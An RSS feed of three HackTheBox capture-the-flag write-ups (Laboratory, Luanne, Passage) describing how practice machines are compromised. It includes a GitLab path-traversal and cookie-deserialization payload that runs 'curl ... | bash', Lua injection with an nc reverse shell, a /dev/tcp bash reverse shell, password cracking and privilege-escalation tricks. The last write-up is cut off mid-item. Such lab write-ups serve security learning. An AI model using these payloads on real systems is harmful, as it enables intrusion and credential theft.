<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>HackTheBox | Mohamed ELLEUCH</title>
    <link>https://mohamed-elleuch.me/tag/hackthebox/</link>
      <atom:link href="https://mohamed-elleuch.me/tag/hackthebox/index.xml" rel="self" type="application/rss+xml" />
    <description>HackTheBox</description>
    <generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><copyright>Copyright Â© Mohamed Elleuch 2021</copyright><lastBuildDate>Sat, 17 Apr 2021 00:00:00 +0000</lastBuildDate>
    <image>
      <url>https://mohamed-elleuch.me/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_512x512_fill_lanczos_center_2.png</url>
      <title>HackTheBox</title>
      <link>https://mohamed-elleuch.me/tag/hackthebox/</link>
    </image>
    
    <item>
      <title>HackTheBox - Laboratory Writeup</title>
      <link>https://mohamed-elleuch.me/writeups/htb-laboratory/</link>
      <pubDate>Sat, 17 Apr 2021 00:00:00 +0000</pubDate>
      <guid>https://mohamed-elleuch.me/writeups/htb-laboratory/</guid>
      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo nmap -sC -sV 10.10.10.216 -v
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Issuer: commonName=laboratory.htb
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-07-05T10:39:28
| Not valid after:  2024-03-03T10:39:28
| MD5:   2873 91a5 5022 f323 4b95 df98 b61a eb6c
|_SHA-1: 0875 3a7e eef6 8f50 0349 510d 9fbf abc3 c70a a1ca
| tls-alpn: 
|_  http/1.1
Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We have 3 ports open:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ssh: 22 running OpenSSH 8.2p1&lt;/li&gt;
&lt;li&gt;http: 80 running Apache httpd 2.4.41&lt;/li&gt;
&lt;li&gt;https: 443 running Apache httpd 2.4.41&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2 Domains:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;laboratory.htb&lt;/li&gt;
&lt;li&gt;git.laboratory.htb&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;p-stylecolorgreenweb-enumerationp&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Web Enumeration&lt;/p&gt;&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;After adding laboratory.htb &amp;amp; git.laboratory.htb to /etc/hosts&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let&amp;rsquo;s check laboratory.htb first&lt;/p&gt;
&lt;img src=&#34;users.png&#34;&gt;
&lt;p&gt;We got 2 usernames:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Dexter&lt;/li&gt;
&lt;li&gt;DeeDee Dee_Dee ..&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Skipping Gobuster scans, as it gave me nothing interesting&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Seems like it&amp;rsquo;s a static website, nothing much to see!&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s move to git.laboratory.htb&lt;/p&gt;
&lt;img src=&#34;gitlab.png&#34;&gt;
&lt;p&gt;Tried few logins but it failed, ( dexter:admin dexter:password )&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s create our own account and see what we can do&lt;/p&gt;
&lt;img src=&#34;reg.png&#34;&gt;
&lt;p&gt;&lt;code&gt;GitLab Community Edition 12.8.1&lt;/code&gt;&lt;/p&gt;
&lt;img src=&#34;git_ver.png&#34;&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolorredinitial-foothold-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Initial foothold &lt;/p&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;I think there are ready-to-use scripts to exploit this gitlab version, but we&amp;rsquo;ll do the process manually!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Bascially we&amp;rsquo;re gonna abuse arbitrary file read via the UploadsRewriter when moving an issue, and get the &lt;code&gt;secret_key_base&lt;/code&gt; from /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml then generate the cookie payload via our own gitlab instance with the key that we got!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If you wanna read more about this exploit: &lt;a href=&#34;https://hackerone.com/reports/827052&#34;&gt;https://hackerone.com/reports/827052&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let&amp;rsquo;s now try to read /etc/passwd from the box&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Let&amp;rsquo;s first create 2 projects&lt;/li&gt;
&lt;/ul&gt;
&lt;img src=&#34;pro.png&#34;&gt;
&lt;ul&gt;
&lt;li&gt;Let&amp;rsquo;s let&amp;rsquo;s an issue in one of these projets containing&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;passwd.png&#34;&gt;
&lt;ul&gt;
&lt;li&gt;Let&amp;rsquo;s now move it to the other project&lt;/li&gt;
&lt;/ul&gt;
&lt;img src=&#34;move.png&#34;&gt;
&lt;img src=&#34;passwd1.png&#34;&gt;
And we get the file!
&lt;img src=&#34;passwd2.png&#34;&gt;
&lt;p&gt;Now let&amp;rsquo;s repeat the same thing to get /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;secret.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s now setup our gitlab env!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;You can either download the gitlab package or use docker&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;For this, I am going to use docker! First let&amp;rsquo;s pull the image&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo docker -D pull gitlab/gitlab-ce:12.8.1-ce.0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;then run it !&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo docker run -it gitlab/gitlab-ce:12.8.1-ce.0 sh
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;docker.png&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;PS: &lt;code&gt;id&lt;/code&gt; command ; force of habit xD&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let&amp;rsquo;s run&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gitlab-ctl reconfigure
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&amp;rsquo;s change the /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml file with the one that we got!
Now, let&amp;rsquo;s run&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gitlab-ctl restart
gitlab-rails console
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Here in the console, we&amp;rsquo;ll craft our cookie to gain access!&lt;/p&gt;
&lt;p&gt;Our payload to craft it:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;request = ActionDispatch::Request.new(Rails.application.env_config)
request.env[&amp;quot;action_dispatch.cookies_serializer&amp;quot;] = :marshal
cookies = request.cookie_jar

erb = ERB.new(&amp;quot;&amp;lt;%= `curl http://10.10.14.3:8000/shell | bash` %&amp;gt;&amp;quot;) 
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, &amp;quot;@result&amp;quot;, ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;cookie.png&#34;&gt;
&lt;p&gt;Final payload:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;curl -vvv &#39;https://git.laboratory.htb/users/sign_in&#39; -b &amp;quot;experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiaCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBjdXJsIGh0dHA6Ly8xMC4xMC4xNC4zOjgwMDAvc2hlbGwgfCBzaGAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--a9181bfd8d26c33c9cf0c6fedcff269a3685902b&amp;quot; -k
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&amp;rsquo;s set a listener, and grab that shell&lt;/p&gt;
&lt;img src=&#34;foothold.png&#34;&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolorreduser-privesc-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;User PrivEsc &lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;So now we&amp;rsquo;re on a docker container as the &lt;strong&gt;git&lt;/strong&gt; user!
The trick now is to change the gitlab&amp;rsquo;s admin (Which is id=1) password
Going through gitlab&amp;rsquo;s docs to get the right syntax
&lt;a href=&#34;https://docs.gitlab.com/ee/security/reset_user_password.html&#34;&gt;https://docs.gitlab.com/ee/security/reset_user_password.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;It may take a while to run&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gitlab-rails console -e production
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;user = User.find(1)
user.password = &#39;password123&#39;
user.password_confirmation = &#39;password123&#39;
user.save!
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;dexterpass.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s login now with his account&lt;/p&gt;
&lt;img src=&#34;projects.png&#34;&gt;
&lt;p&gt;There is a private repo that contains his home directory backup!&lt;/p&gt;
&lt;img src=&#34;ssh.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s copy his ssh private key and get into the box!&lt;/p&gt;
&lt;img src=&#34;user.png&#34;&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolorredroot-privesc-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Root PrivEsc &lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;Let&amp;rsquo;s first run Linpeas!
Going through the output, we can see that there is unusual suid binary
&lt;img src=&#34;suid.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;let&amp;rsquo;s run Ltrace on this binary&lt;/p&gt;
&lt;img src=&#34;ltrace.png&#34;&gt;
&lt;p&gt;We can abuse this binary, by creating a fake malicious chmod binary&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;echo &amp;quot;/bin/bash -p&amp;quot; &amp;gt; /tmp/chmod
chmod 777 /tmp/chmod
export PATH=/tmp:$PATH
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Then we run the binary!&lt;/p&gt;
&lt;img src=&#34;root.png&#34;&gt;
And we rooted the box!
&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
</description>
    </item>
    
    <item>
      <title>HackTheBox - Luanne Writeup</title>
      <link>https://mohamed-elleuch.me/writeups/htb-luanne/</link>
      <pubDate>Sat, 27 Mar 2021 00:00:00 +0000</pubDate>
      <guid>https://mohamed-elleuch.me/writeups/htb-luanne/</guid>
      <description>&lt;h1 id=&#34;p-stylecolordarkredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:DArkRED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo nmap -sC -sV 10.10.10.218 -v
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;nmap.png&#34;&gt;
&lt;p&gt;As we can see above, We have 3 PORTS open:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Port 22 running OpenSSH 8.0 ; Recent version, no need waste time on it&lt;/li&gt;
&lt;li&gt;Port 80 running nginx ; robots.txt &amp;ndash;&amp;gt; /weather&lt;/li&gt;
&lt;li&gt;Port 9001 running Medusa httpd 1.12 ; If we were on linux i think this should be something to look at&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Skipping the gobuster part, it will only show us robots.txt. I do prefer Dirb when it comes to directory bruteforcing&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;p-stylecolorgreendirb-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Dirb scan &lt;/p&gt;&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;You can clone the SecLists repo from here &lt;a href=&#34;https://github.com/danielmiessler/SecLists&#34;&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We already got  &lt;strong&gt;/weather/&lt;/strong&gt; from the nmap results, let&amp;rsquo;s see enum more&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;dirb -R http://10.10.10.218/weather/ /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt 
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;dirb.png&#34;&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolordarkredfootholdp&#34;&gt;&lt;p style=&#34;color:DArkRED&#34;&gt;Foothold&lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;From our previous scans we were able to find&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;http://10.10.10.218/weather/forecast/
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;forecast.png&#34;&gt;
Let&#39;s try it as a GET param
&lt;img src=&#34;get.png&#34;&gt;
Adding a &lt; &#39; &gt; causes an error
&lt;img src=&#34;luaerror.png&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;Skipping the SQL Injection part as it got me nothing&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let&amp;rsquo;s now try if we have any potential code injection.
Basically, The idea is to end the current lua command and inject.
Another think to note for lua a comment starts anywhere with a double hyphen ( &amp;ndash; ) and runs until the end of the line.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s first try this payload&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;/weather/forecast?city=London&#39;);print(&amp;quot;\nhi&amp;quot;)--
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;print.png&#34;&gt;
That worked! Let&#39;s try if we can use system commands
&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;/weather/forecast?city=London&#39;);print(&amp;quot;\n&amp;quot;);os.execute(&amp;quot;id&amp;quot;)--
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;id.png&#34;&gt;
&lt;p&gt;That worked aswell! Let&amp;rsquo;s now get a reverse shell&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc ip port &amp;gt;/tmp/f
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Final url encoded payload:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;/weather/forecast?city=%4c%6f%6e%64%6f%6e%27%29%3b%70%72%69%6e%74%28%22%5c%6e%22%29%3b%6f%73%2e%65%78%65%63%75%74%65%28%22%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%34%2e%33%39%20%31%32%33%34%20%3e%2f%74%6d%70%2f%66%22%29%2d%2d
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&amp;rsquo;s execute it and get a shell on the box
&lt;img src=&#34;foothold.png&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolordarkreduser-privescp&#34;&gt;&lt;p style=&#34;color:darkred&#34;&gt;User PrivEsc&lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;We can see that we have the default  &lt;strong&gt;.htpasswd&lt;/strong&gt; file which can contain potential passwords
&lt;img src=&#34;pass.png&#34;&gt;
Let&amp;rsquo;s see what we got there
&lt;img src=&#34;webapi.png&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;echo &amp;quot;$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0&amp;quot; &amp;gt; hash ; john hash -w=/opt/rockyou.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And we cracked it!
&lt;img src=&#34;best.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s start by viewing the running processes&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;You need to specify the w tag to view the whole command&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&#34;mich.png&#34;&gt;
We can see that the user **r.michaels** is running a local server at port 3001! Let&#39;s exploit this to get his private SSH key!
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;curl http://127.0.0.1:3001/~r.michaels/id_rsa
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;But we get 401 Unauthorized page!&lt;/p&gt;
&lt;img src=&#34;unauth.png&#34;&gt;
Let&#39;s try the credentials that we got earlier
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;curl http://127.0.0.1:3001/~r.michaels/id_rsa --user webapi_user:iamthebest
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;ssh.png&#34;&gt;
And it worked! Let&#39;s login to the user
&lt;img src=&#34;user.png&#34;&gt;
&lt;p&gt;And we grab that user flag!&lt;/p&gt;
&lt;h1 id=&#34;p-stylecolordarkredroot-privescp&#34;&gt;&lt;p style=&#34;color:darkred&#34;&gt;Root PrivEsc&lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;An interesting backups file which contains an encrypted tar.gz file&lt;/p&gt;
&lt;img src=&#34;back.png&#34;&gt;
&lt;p&gt;Because we&amp;rsquo;re on an NetBSD box, we&amp;rsquo;re gonna use netpgp to decrypt then extract its content&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=backup.tar.gz
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;tar.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s check that .htpasswd file!
&lt;img src=&#34;root.png&#34;&gt;
&lt;code&gt;webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s crack this password with john!&lt;/p&gt;
&lt;img src=&#34;pass_root.png&#34;&gt;
&lt;p&gt;&lt;code&gt;littlebear&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s try to switch to the root user with this password!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://www.vultr.com/docs/introduction-to-doas-on-NetBSD&#34;&gt;https://www.vultr.com/docs/introduction-to-doas-on-NetBSD&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;doas su
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;roott.png&#34;&gt;
&lt;p&gt;And we rooted the box!&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolordarkredbonus-sectionp&#34;&gt;&lt;p style=&#34;color:darkred&#34;&gt;Bonus Section&lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;Let&amp;rsquo;s see what caused the lua injection!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cat /home/r.michaels/devel/webapi/weather.lua
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Going through the code we can see the injection point!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;httpd.write(&#39;&amp;quot;error&amp;quot;: &amp;quot;unknown city: &#39; .. city .. &#39;&amp;quot;}&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;basically what we have done is&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;httpd.write(&#39;&amp;quot;error&amp;quot;: &amp;quot;unknown city: hi&#39;);os.execute(&amp;quot;id&amp;quot;) -- &#39;&amp;quot;}&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;To avoid this kind of injection, we should validate and sanitize the &amp;ldquo;city&amp;rdquo; input. Scanning the city variable for escape characters and special symbols, making a blacklist for any suspicious word {os,execute,print,&amp;hellip;}
Or just by removing the &amp;lsquo;.. city ..&amp;rsquo; part!&lt;/p&gt;
&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
</description>
    </item>
    
    <item>
      <title>HackTheBox - Passage Writeup</title>
      <link>https://mohamed-elleuch.me/writeups/htb-passage/</link>
      <pubDate>Sat, 06 Mar 2021 00:00:00 +0000</pubDate>
      <guid>https://mohamed-elleuch.me/writeups/htb-passage/</guid>
      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;rustscan -a 10.10.10.206 -- -A -sC -sV&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Open 10.10.10.206:22
Open 10.10.10.206:80
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|   256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)

80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt; We have two ports open 
	Port 22 : OpenSSH 7.2p2
	Port 80 : Apache httpd 2.4.18
&lt;/p&gt;
&lt;h2 id=&#34;p-stylecolorgreenexploring-the-webserver-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Exploring the WebServer &lt;/p&gt;&lt;/h2&gt;
&lt;p&gt;Let&amp;rsquo;s first add Passage.htb to our hosts file!&lt;/p&gt;
&lt;p&gt;We can see that Fail2Ban is Implemented on the server! So no need to waste our time trying bruteforcing dirs and files&lt;/p&gt;
&lt;img src=&#34;fail2ban.png&#34;&gt; 
&lt;p&gt;What really catchs my eye is&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Powered by CuteNews&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;A simple search on google can reveal the default dir for CuteNews CMS which is /CuteNews/&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s see what we get!
&lt;img src=&#34;cuteCMS.png&#34;&gt;
Nice! We got the CMS version&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Powered by CuteNews 2.1.2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s find a vulnerability related to this version!&lt;/p&gt;
&lt;h1 id=&#34;p-stylecolorredinitial-foothold-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Initial Foothold &lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;Let&amp;rsquo;s see what searchsploit has for us!&lt;/p&gt;
&lt;img src=&#34;Searchsploit.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s grab that juicy RCE python exploit&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;searchsploit -m php/webapps/48800.py
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And run our script, We only need to provide &lt;b&gt;	http://passage.htb&lt;/b&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python3 48800.py
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;foothold.png&#34;&gt;
&lt;p&gt;And we&amp;rsquo;re on the box!&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s get a proper shell on the box!&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;IP&amp;gt;/&amp;lt;PORT&amp;gt; 0&amp;gt;&amp;amp;1&#39;&lt;/code&gt;&lt;/p&gt;
&lt;img src=&#34;pwncat.png&#34;&gt;
&lt;h1 id=&#34;p-stylecolorreduser-privescp&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;User Privesc&lt;/p&gt;&lt;/h1&gt;
&lt;h2 id=&#34;p-stylecolorgreenpaul-user-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Paul user &lt;/p&gt;&lt;/h2&gt;
&lt;p&gt;Going through the webserver config, I found an interesting directory&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/var/www/html/CuteNews/cdata/users&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Which seem to contain some juicy encoded informations&lt;/p&gt;
&lt;img src=&#34;encoded.png&#34;&gt;
&lt;p&gt;It looks like it&amp;rsquo;s Base64 encoded!
Let&amp;rsquo;s decode it&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;a:1:{s:4:&amp;quot;name&amp;quot;;a:1:{s:5:&amp;quot;admin&amp;quot;;a:8:{s:2:&amp;quot;id&amp;quot;;s:10:&amp;quot;1592483047&amp;quot;;s:4:&amp;quot;name&amp;quot;;s:5:&amp;quot;admin&amp;quot;;s:3:&amp;quot;acl&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:5:&amp;quot;email&amp;quot;;s:17:&amp;quot;nadav@passage.htb&amp;quot;;s:4:&amp;quot;pass&amp;quot;;s:64:&amp;quot;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1&amp;quot;;s:3:&amp;quot;lts&amp;quot;;s:10:&amp;quot;1592487988&amp;quot;;s:3:&amp;quot;ban&amp;quot;;s:1:&amp;quot;0&amp;quot;;s:3:&amp;quot;cnt&amp;quot;;s:1:&amp;quot;2&amp;quot;;}}}
&lt;/code&gt;&lt;/pre&gt;
